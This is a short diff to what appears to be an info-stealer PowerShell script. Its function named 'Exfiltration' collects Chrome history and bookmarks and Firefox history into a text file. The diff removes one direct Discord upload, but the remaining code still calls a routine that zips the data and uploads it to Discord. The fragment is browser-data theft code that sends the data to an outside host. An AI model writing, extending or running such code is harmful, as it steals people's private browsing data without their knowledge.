@@ -102,7 +102,6 @@ function Exfiltration {
     GrabBrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
     GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
     GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
-    Upload-Discord -file "BrowserData.txt" -text "Browser Data:"
 
     #Call ZipAndUploadToDiscord
     ZipAndUploadToDiscord
